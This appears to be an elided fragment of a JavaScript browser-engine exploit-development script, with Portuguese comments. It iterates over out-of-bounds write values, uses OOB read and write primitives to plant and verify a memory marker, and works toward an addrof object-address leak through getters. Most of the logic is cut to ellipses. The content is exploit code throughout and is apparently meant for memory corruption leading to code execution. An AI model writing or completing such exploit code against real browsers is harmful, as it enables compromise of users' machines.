...
const SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R41 = 0x100; 
...
export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R41() { 
    ...
    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        const current_oob_hex_val = toHex(current_oob_value || 0); // Garante que é um número para toHex
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_OOB${current_oob_hex_val}`;
        logS3(`\n===== ITERATION R41: OOB Write Value: ${current_oob_hex_val} =====`, "subtest", FNAME_CURRENT_ITERATION);
        ...
        const current_object_to_leak_A = { marker_A_R41: `LeakA_OOB_Val${current_oob_hex_val}`,r:Math.random() };
        const current_object_to_leak_B = { marker_B_R41: `LeakB_OOB_Val${current_oob_hex_val}`,r:Math.random() };
        ...
        try { 
            ...
            if (heisenbugConfirmedThisIter) { 
                try {
                    // R41: Verifica o estado OOB ANTES de plantar o marcador
                    logS3(`  MemScan: Verificando OOB antes de plantar marcador...`, 'debug', FNAME_CURRENT_ITERATION);
                    await triggerOOB_primitive({ force_reinit: false, caller_fname: `${FNAME_CURRENT_ITERATION}-PreMarkerPlantCheck` }); 
                    ...
                    logS3(`  MemScan: Ambiente OOB OK. Plantando marcador ${SCAN_MARKER_VALUE_R41.toString(true)} em oob_array_buffer_real[${toHex(SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R41)}]...`, 'info');
                    oob_write_absolute(SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R41, SCAN_MARKER_VALUE_R41, 8);
                    
                    let verify_marker;
                    logS3(`  MemScan: Verificando marcador plantado...`, 'debug', FNAME_CURRENT_ITERATION);
                    try {
                        verify_marker = oob_read_absolute(SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R41, 8);
                    } catch (e_verify_read) {
                    ...
                    if (!verify_marker.equals(SCAN_MARKER_VALUE_R41)) {
                        throw new Error(`Falha ao VERIFICAR o marcador. Lido: ${verify_marker.toString(true)}, Esperado: ${SCAN_MARKER_VALUE_R41.toString(true)}`);
                    }
        ...
        let current_iter_summary = { 
            oob_value:current_oob_hex_val, // Usa o valor já convertido para toHex
        ...
        // <<<< Lógica ATUALIZADA para best_result_for_runner (R41) >>>>
        ...
        if (scan_successful_this_iter) {
            if (!current_best_had_scan_success || (current_iter_summary.error === null && best_result_for_runner.errorOccurred !== null) || !best_result_for_runner.oob_value_used) {
